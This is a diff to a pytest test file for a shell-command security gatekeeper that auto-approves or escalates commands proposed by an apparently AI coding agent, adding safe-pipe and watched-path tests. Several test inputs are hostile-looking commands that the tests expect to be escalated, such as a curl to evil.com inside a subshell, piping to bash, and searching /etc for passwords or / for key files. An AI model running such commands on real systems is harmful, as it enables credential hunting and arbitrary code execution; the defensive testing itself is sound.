@@ -7,6 +7,7 @@ and gatekeeper config reader.
 """
 
 import json
+import os
 import sqlite3
 import sys
 import pytest
@@ -473,14 +474,14 @@ class TestCompoundCommands:
         """
         assert gk.local_evaluate("true") == "YES"
 
-    def test_mixed_operators_not_auto_approved(self):
-        """Mix of && and | still goes to LLM.
+    def test_compound_with_pipe_sub_part(self):
+        """Compound && with safe pipe sub-part auto-approves.
 
         >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
-        >>> local_evaluate("cd /tmp && git log | head") is None
+        >>> local_evaluate("cd /tmp && git log | head") == "YES"
         True
         """
-        assert gk.local_evaluate("cd /tmp && git log | head") is None
+        assert gk.local_evaluate("cd /tmp && git log | head") == "YES"
 
     def test_three_safe_commands(self):
         """Three safe commands chained with && should auto-approve.
@@ -517,6 +518,123 @@ class TestCompoundCommands:
         'YES'
         """
         assert gk.local_evaluate("cd /tmp && git status") == "YES"
+
+
+# ---------------------------------------------------------------------------
+# Safe pipe evaluation
+# ---------------------------------------------------------------------------
+
+class TestSafePipeEvaluation:
+    """Pipe commands auto-approve only with restricted safe sources and sinks."""
+
+    def test_jacked_log_pipe_tail(self):
+        """The original trigger: jacked log piped to tail.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("jacked log command dc 2>&1 | tail -1") == "YES"
+        True
+        """
+        assert gk.local_evaluate("jacked log command dc 2>&1 | tail -1") == "YES"
+
+    def test_compound_and_pipe(self):
+        """cd && jacked log | tail — compound handler delegates pipe sub-part.
+
+        >>> # Compound splits on &&, pipe sub-part checked by _is_pipe_safe
+        """
+        assert gk.local_evaluate("cd /c/Github/foo && jacked log command dc 2>&1 | tail -1") == "YES"
+
+    def test_git_log_pipe_head(self):
+        """git log | head -5 auto-approves.
+
+        >>> # git log is safe source, head is safe sink
+        """
+        assert gk.local_evaluate("git log | head -5") == "YES"
+
+    def test_git_status_pipe_grep(self):
+        """git status | grep modified auto-approves.
+
+        >>> # Both sides safe
+        """
+        assert gk.local_evaluate("git status | grep modified") == "YES"
+
+    def test_pip_list_pipe_grep(self):
+        """pip list | grep jacked auto-approves.
+
+        >>> # pip list safe source, grep safe sink
+        """
+        assert gk.local_evaluate("pip list | grep jacked") == "YES"
+
+    def test_ls_pipe_head(self):
+        """ls -la | head auto-approves.
+
+        >>> # ls safe source, head safe sink
+        """
+        assert gk.local_evaluate("ls -la | head") == "YES"
+
+    def test_multi_pipe_chain(self):
+        """git log | grep fix | head -5 — multi-pipe with all safe sinks.
+
+        >>> # All sinks are safe
+        """
+        assert gk.local_evaluate("git log | grep fix | head -5") == "YES"
+
+    def test_python_m_jacked_pipe(self):
+        """python -m jacked matches SAFE_PYTHON_PATTERNS for pipe source.
+
+        >>> # SAFE_PYTHON_PATTERNS covers python -m jacked
+        """
+        assert gk.local_evaluate("python -m jacked status | tail -1") == "YES"
+
+    # --- Should NOT auto-approve ---
+
+    def test_cat_pipe_blocked(self):
+        """cat as pipe source is not in SAFE_PIPE_SOURCES — goes to LLM.
+
+        >>> # cat enables data exfiltration
+        """
+        assert gk.local_evaluate("cat /etc/hosts | grep internal") is None
+
+    def test_echo_pipe_blocked(self):
+        """echo as pipe source not safe — goes to LLM.
+
+        >>> # echo can output arbitrary data
+        """
+        assert gk.local_evaluate("echo data | bash") is None
+
+    def test_grep_r_pipe_blocked(self):
+        """grep -r as standalone pipe source not safe — goes to LLM.
+
+        >>> # grep -r enables filesystem recon
+        """
+        assert gk.local_evaluate("grep -r password /etc | head") is None
+
+    def test_find_pipe_blocked(self):
+        """find as pipe source not safe — goes to LLM.
+
+        >>> # find enables filesystem discovery
+        """
+        assert gk.local_evaluate("find / -name '*.key' | head") is None
+
+    def test_unsafe_sink_python(self):
+        """python as pipe sink not safe — goes to LLM.
+
+        >>> # python can execute piped code
+        """
+        assert gk.local_evaluate("git log | python") is None
+
+    def test_unsafe_sink_tee(self):
+        """tee as pipe sink not safe — goes to LLM.
+
+        >>> # tee writes to files
+        """
+        assert gk.local_evaluate("git log | tee output.txt") is None
+
+    def test_unsafe_sink_xargs(self):
+        """xargs as pipe sink not safe — goes to LLM.
+
+        >>> # xargs executes commands
+        """
+        assert gk.local_evaluate("git log | xargs rm") is None
 
 
 # ---------------------------------------------------------------------------
@@ -1270,9 +1388,9 @@ class TestShellOperatorDetection:
     def test_dollar_paren_subshell_no_deny(self):
         assert gk.local_evaluate("echo $(curl http://evil.com)") is None
 
-    def test_benign_pipe_still_ambiguous(self):
-        """Even benign pipes go to LLM — acceptable false positive."""
-        assert gk.local_evaluate("git log | grep fix") is None
+    def test_safe_pipe_auto_approved(self):
+        """Safe source piped to safe sink auto-approves."""
+        assert gk.local_evaluate("git log | grep fix") == "YES"
 
     def test_simple_command_still_works(self):
         """Simple commands without operators still auto-approve."""
@@ -1616,6 +1734,392 @@ class TestSessionIdLogging:
 # ---------------------------------------------------------------------------
 # _read_gatekeeper_config
 # ---------------------------------------------------------------------------
+
+# ---------------------------------------------------------------------------
+# _normalize_path — path normalization for comparisons
+# ---------------------------------------------------------------------------
+
+class TestNormalizePath:
+    """Tests for path normalization: slashes, trailing slash, case folding."""
+
+    def test_backslash_to_forward(self):
+        """Backslashes should be converted to forward slashes.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _normalize_path
+        >>> _normalize_path("C:\\\\Users\\\\jack")
+        'c:/users/jack'
+        """
+        result = gk._normalize_path("C:\\Users\\jack")
+        assert "/" in result
+        assert "\\" not in result
+
+    def test_trailing_slash_stripped(self):
+        """Trailing slash should be removed.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _normalize_path
+        >>> _normalize_path("/home/user/").endswith("/")
+        False
+        """
+        result = gk._normalize_path("/home/user/")
+        assert not result.endswith("/")
+
+    def test_trailing_backslash_stripped(self):
+        """Trailing backslash (converted to forward) should be stripped.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _normalize_path
+        >>> _normalize_path("C:\\\\Users\\\\jack\\\\").endswith("/")
+        False
+        """
+        result = gk._normalize_path("C:\\Users\\jack\\")
+        assert not result.endswith("/")
+
+    @pytest.mark.skipif(
+        __import__("os").name != "nt",
+        reason="Case folding only on Windows",
+    )
+    def test_case_folded_on_windows(self):
+        """On Windows, paths are case-folded to lowercase.
+
+        >>> import os
+        >>> from jacked.data.hooks.security_gatekeeper import _normalize_path
+        >>> _normalize_path("C:/Users/Jack") if os.name == 'nt' else 'c:/users/jack'
+        'c:/users/jack'
+        """
+        assert gk._normalize_path("C:/Users/Jack") == "c:/users/jack"
+
+    def test_empty_string(self):
+        """Empty string should remain empty.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _normalize_path
+        >>> _normalize_path("")
+        ''
+        """
+        assert gk._normalize_path("") == ""
+
+    def test_mixed_slashes(self):
+        """Mixed slashes should all become forward.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _normalize_path
+        >>> "\\\\" not in _normalize_path("C:\\\\Users/jack\\\\docs")
+        True
+        """
+        result = gk._normalize_path("C:\\Users/jack\\docs")
+        assert "\\" not in result
+        assert result.count("/") >= 2
+
+
+# ---------------------------------------------------------------------------
+# _is_watched_path — watched path enforcement
+# ---------------------------------------------------------------------------
+
+class TestIsWatchedPath:
+    """Tests for watched path matching: exact, child, non-match, normalization."""
+
+    def test_empty_watched_list(self, tmp_path):
+        """No watched paths means no match.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> _is_watched_path("main.py", "/home/user", [])
+        """
+        assert gk._is_watched_path("main.py", str(tmp_path), []) is None
+
+    def test_exact_directory_match(self, tmp_path):
+        """File at the root of a watched path should match.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> _is_watched_path("/secret/vault/key.txt", "/home/user", ["/secret/vault"])
+        'watched path (/secret/vault)'
+        """
+        watched = str(tmp_path)
+        test_file = tmp_path / "secret.txt"
+        test_file.write_text("secret")
+        result = gk._is_watched_path(str(test_file), str(tmp_path), [watched])
+        assert result is not None
+        assert "watched path" in result
+
+    def test_child_path_match(self, tmp_path):
+        """File deeply nested under a watched path should match.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> _is_watched_path("/watched/sub/deep/file.txt", "/home", ["/watched"])
+        'watched path (/watched)'
+        """
+        sub = tmp_path / "deep" / "nested"
+        sub.mkdir(parents=True)
+        test_file = sub / "file.txt"
+        test_file.write_text("data")
+        result = gk._is_watched_path(str(test_file), str(tmp_path), [str(tmp_path)])
+        assert result is not None
+
+    def test_non_match(self, tmp_path):
+        """File outside watched path should not match.
+
+        >>> import tempfile
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> _is_watched_path("/other/file.txt", "/home", ["/watched"])
+        """
+        other = tmp_path / "other"
+        other.mkdir()
+        test_file = other / "file.txt"
+        test_file.write_text("data")
+        watched = tmp_path / "watched"
+        watched.mkdir()
+        result = gk._is_watched_path(str(test_file), str(tmp_path), [str(watched)])
+        assert result is None
+
+    def test_relative_path_resolved(self, tmp_path):
+        """Relative file path should be resolved against cwd before checking.
+
+        >>> import tempfile
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> td = tempfile.mkdtemp()
+        >>> _is_watched_path("main.py", td, [td]) is not None
+        True
+        """
+        test_file = tmp_path / "main.py"
+        test_file.write_text("code")
+        result = gk._is_watched_path("main.py", str(tmp_path), [str(tmp_path)])
+        assert result is not None
+
+    @pytest.mark.skipif(
+        __import__("os").name != "nt",
+        reason="Case folding only on Windows",
+    )
+    def test_case_insensitive_on_windows(self, tmp_path):
+        """On Windows, path comparison should be case-insensitive.
+
+        >>> import os
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> _is_watched_path("C:/Users/JACK/file.txt", "C:/", ["C:/Users/jack"]) if os.name == 'nt' else 'watched path (C:/Users/jack)'
+        'watched path (C:/Users/jack)'
+        """
+        # Use the actual tmp_path with different casing
+        watched_lower = str(tmp_path).lower()
+        test_file = tmp_path / "file.txt"
+        test_file.write_text("data")
+        result = gk._is_watched_path(str(test_file).upper(), str(tmp_path), [watched_lower])
+        assert result is not None
+
+    def test_slash_normalization(self, tmp_path):
+        """Backslash and forward slash paths should both match.
+
+        >>> import tempfile, os
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> td = tempfile.mkdtemp()
+        """
+        test_file = tmp_path / "test.txt"
+        test_file.write_text("data")
+        # Use backslash version as watched path
+        watched_backslash = str(tmp_path).replace("/", "\\")
+        result = gk._is_watched_path(str(test_file), str(tmp_path), [watched_backslash])
+        assert result is not None
+
+    def test_empty_watched_path_skipped(self, tmp_path):
+        """Empty string in watched paths list should be safely skipped.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> _is_watched_path("file.txt", "/home", ["", ""])
+        """
+        test_file = tmp_path / "file.txt"
+        test_file.write_text("data")
+        result = gk._is_watched_path(str(test_file), str(tmp_path), ["", ""])
+        assert result is None
+
+    def test_reason_contains_original_path(self, tmp_path):
+        """Returned reason should contain the original watched path string.
+
+        >>> import tempfile
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> td = tempfile.mkdtemp()
+        >>> result = _is_watched_path("file.txt", td, [td])
+        >>> td in result if result else False
+        True
+        """
+        test_file = tmp_path / "file.txt"
+        test_file.write_text("data")
+        result = gk._is_watched_path(str(test_file), str(tmp_path), [str(tmp_path)])
+        assert str(tmp_path) in result
+
+    def test_watched_path_prefix_trap(self, tmp_path):
+        """A watched path that's a prefix of another dir name should NOT match.
+
+        e.g., watched=/foo should NOT match /foobar/file.txt
+
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> _is_watched_path("/foobar/file.txt", "/home", ["/foo"])
+        """
+        watched_dir = tmp_path / "prod"
+        watched_dir.mkdir()
+        other_dir = tmp_path / "production"
+        other_dir.mkdir()
+        test_file = other_dir / "file.txt"
+        test_file.write_text("data")
+        result = gk._is_watched_path(str(test_file), str(tmp_path), [str(watched_dir)])
+        assert result is None
+
+    def test_multiple_watched_paths_match_first(self, tmp_path):
+        """With multiple watched paths, should match whichever applies.
+
+        >>> import tempfile
+        >>> from jacked.data.hooks.security_gatekeeper import _is_watched_path
+        >>> td = tempfile.mkdtemp()
+        """
+        sub1 = tmp_path / "a"
+        sub1.mkdir()
+        sub2 = tmp_path / "b"
+        sub2.mkdir()
+        test_file = sub2 / "file.txt"
+        test_file.write_text("data")
+        result = gk._is_watched_path(str(test_file), str(tmp_path), [str(sub1), str(sub2)])
+        assert result is not None
+        assert str(sub2) in result
+
+
+# ---------------------------------------------------------------------------
+# _check_path_safety — watched paths integration
+# ---------------------------------------------------------------------------
+
+class TestCheckPathSafetyWatched:
+    """Tests that watched paths are checked FIRST in _check_path_safety."""
+
+    def test_watched_overrides_allowed(self, tmp_path):
+        """Watched path takes priority even if path is in allowed_paths.
+
+        >>> import tempfile
+        >>> from jacked.data.hooks.security_gatekeeper import _check_path_safety
+        >>> td = tempfile.mkdtemp()
+        """
+        test_file = tmp_path / "file.txt"
+        test_file.write_text("data")
+        config = {
+            "enabled": True,
+            "disabled_patterns": [],
+            "allowed_paths": [str(tmp_path)],
+            "watched_paths": [str(tmp_path)],
+        }
+        result = gk._check_path_safety(str(test_file), str(tmp_path), config)
+        assert result is not None
+        assert "watched path" in result
+
+    def test_disabled_master_skips_watched(self, tmp_path):
+        """When master toggle is off, watched paths are not checked.
+
+        >>> import tempfile
+        >>> from jacked.data.hooks.security_gatekeeper import _check_path_safety
+        >>> td = tempfile.mkdtemp()
+        >>> _check_path_safety("file.txt", td, {"enabled": False, "watched_paths": [td]})
+        """
+        config = {
+            "enabled": False,
+            "watched_paths": [str(tmp_path)],
+        }
+        result = gk._check_path_safety("file.txt", str(tmp_path), config)
+        assert result is None
+
+    def test_no_watched_paths_falls_through(self, tmp_path):
+        """Without watched paths, normal path safety rules apply.
+
+        >>> import tempfile
+        >>> from jacked.data.hooks.security_gatekeeper import _check_path_safety
+        >>> td = tempfile.mkdtemp()
+        >>> _check_path_safety(".env", td, {"enabled": True, "allowed_paths": [], "disabled_patterns": [], "watched_paths": []})
+        'sensitive file (.env files)'
+        """
+        config = {
+            "enabled": True,
+            "disabled_patterns": [],
+            "allowed_paths": [],
+            "watched_paths": [],
+        }
+        result = gk._check_path_safety(".env", str(tmp_path), config)
+        assert result is not None
+        assert "sensitive file" in result
+
+
+# ---------------------------------------------------------------------------
+# _check_bash_path_safety — watched paths in bash commands
+# ---------------------------------------------------------------------------
+
+class TestBashWatchedPaths:
+    """Tests for deterministic watched path detection in Bash commands."""
+
+    def test_absolute_windows_path_caught(self, tmp_path):
+        """Absolute Windows path referencing watched dir is caught.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _check_bash_path_safety
+        """
+        watched = str(tmp_path).replace("\\", "/")
+        config = {"enabled": True, "allowed_paths": [], "disabled_patterns": [], "watched_paths": [watched]}
+        result = gk._check_bash_path_safety(f"cat {watched}/notes.txt", str(tmp_path), config)
+        assert result is not None
+        assert "watched path" in result
+
+    @pytest.mark.skipif(os.name == "nt", reason="Unix paths resolve differently on Windows")
+    def test_absolute_unix_path_caught(self):
+        """Absolute Unix path referencing watched dir is caught.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _check_bash_path_safety
+        """
+        config = {"enabled": True, "allowed_paths": [], "disabled_patterns": [], "watched_paths": ["/private/vault"]}
+        result = gk._check_bash_path_safety("cat /private/vault/data.txt", "/home/user", config)
+        assert result is not None
+        assert "watched path" in result
+
+    def test_relative_path_not_caught(self, tmp_path):
+        """Relative paths in bash aren't caught by deterministic check (LLM fallback handles these).
+
+        >>> from jacked.data.hooks.security_gatekeeper import _check_bash_path_safety
+        """
+        config = {"enabled": True, "allowed_paths": [], "disabled_patterns": [], "watched_paths": [str(tmp_path)]}
+        result = gk._check_bash_path_safety("cat ../other/notes.txt", str(tmp_path), config)
+        # Relative paths don't match the absolute path regex — expected behavior
+        # The LLM fallback handles these
+        assert result is None or "watched path" not in (result or "")
+
+    def test_no_watched_paths_no_match(self, tmp_path):
+        """Without watched paths, no match.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _check_bash_path_safety
+        """
+        config = {"enabled": True, "allowed_paths": [], "disabled_patterns": [], "watched_paths": []}
+        result = gk._check_bash_path_safety(f"cat {tmp_path}/file.txt", str(tmp_path), config)
+        assert result is None
+
+    def test_unrelated_path_not_caught(self, tmp_path):
+        """Absolute path not under watched dir is not caught.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _check_bash_path_safety
+        """
+        watched = tmp_path / "watched"
+        watched.mkdir()
+        other = tmp_path / "other"
+        other.mkdir()
+        config = {"enabled": True, "allowed_paths": [], "disabled_patterns": [], "watched_paths": [str(watched)]}
+        result = gk._check_bash_path_safety(f"cat {other}/file.txt", str(tmp_path), config)
+        # Should not match watched path (but might match other rules like different drive)
+        assert result is None or "watched path" not in (result or "")
+
+    def test_disabled_skips_watched(self, tmp_path):
+        """When path safety disabled, watched paths in bash are skipped.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _check_bash_path_safety
+        """
+        watched = str(tmp_path).replace("\\", "/")
+        config = {"enabled": False, "allowed_paths": [], "disabled_patterns": [], "watched_paths": [watched]}
+        result = gk._check_bash_path_safety(f"cat {watched}/notes.txt", str(tmp_path), config)
+        assert result is None
+
+    def test_quoted_path_caught(self, tmp_path):
+        """Absolute path in quotes is still caught.
+
+        >>> from jacked.data.hooks.security_gatekeeper import _check_bash_path_safety
+        """
+        watched = str(tmp_path).replace("\\", "/")
+        config = {"enabled": True, "allowed_paths": [], "disabled_patterns": [], "watched_paths": [watched]}
+        result = gk._check_bash_path_safety(f'cat "{watched}/notes.txt"', str(tmp_path), config)
+        assert result is not None
+        assert "watched path" in result
+
 
 class TestReadGatekeeperConfig:
     """Tests for reading gatekeeper config from SQLite settings DB."""
